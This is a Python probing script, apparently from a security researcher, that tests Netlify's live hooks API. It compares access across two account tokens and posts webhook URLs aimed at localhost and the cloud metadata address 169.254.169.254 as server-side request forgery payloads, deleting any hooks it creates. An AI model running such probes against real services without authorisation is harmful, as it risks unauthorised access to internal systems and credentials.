# -*- coding: utf-8 -*-
"""hooks 系列: GET /hooks, /hooks/types, POST /hooks 各种 body"""
import http.client, ssl, gzip, brotli, json, sys, time, random, string
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import TOKEN_A, TOKEN_B

ctx = ssl.create_default_context()
SITE_A = '04f08ff6-f274-47ac-b6d7-5fb1e055f3b4'

def req(method, path, body=None, token=TOKEN_A, timeout=25):
    conn = http.client.HTTPSConnection('api.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json'}
    if body is not None:
        h['Content-Type'] = 'application/json'
    if token: h['Authorization'] = 'Bearer ' + token
    b = json.dumps(body).encode() if isinstance(body, (dict, list)) else body
    conn.request(method, path, body=b, headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br': raw = brotli.decompress(raw)
    elif enc == 'gzip': raw = gzip.decompress(raw)
    st = r.status
    txt = raw.decode('utf-8', 'ignore')
    conn.close()
    return st, txt

def probe(tag, m, p, body=None, tok=TOKEN_A):
    st, b = req(m, p, body, tok)
    print('%-60s %s | %s' % (tag, st, b[:300].replace('\n', ' ')))
    return st, b

print('== 1. 现有 hooks ==')
st, b = probe('A GET /hooks', 'GET', '/api/v1/hooks')
st, b = probe('A GET /hooks/types', 'GET', '/api/v1/hooks/types')
st, b = probe('B GET /hooks(对照)', 'GET', '/api/v1/hooks', None, TOKEN_B)

print()
print('== 2. POST /hooks 形态 ==')
rnd = ''.join(random.choices(string.ascii_lowercase, k=6))
bodies = [
    {'type': 'url', 'event': 'deploy_succeeded', 'url': 'https://example.com/%s' % rnd},
    {'type': 'url', 'url': 'https://example.com/%s' % rnd},
    {'type': 'url', 'event': 'deploy_succeeded', 'url': 'http://127.0.0.1:8000/%s' % rnd},
    {'type': 'url', 'event': 'deploy_succeeded', 'url': 'http://169.254.169.254/latest/meta-data/'},
    {'type': 'slack', 'url': 'https://hooks.slack.com/services/zz/%s' % rnd},
]
for body in bodies:
    st, b = probe('POST hook %s' % json.dumps(body)[:70], 'POST', '/api/v1/hooks', body)
    if st in (200, 201):
        try:
            hid = json.loads(b).get('id')
            if hid:
                req('DELETE', '/api/v1/hooks/%s' % hid)
                print('   cleaned', hid)
        except Exception:
            pass
    print()
print('done')
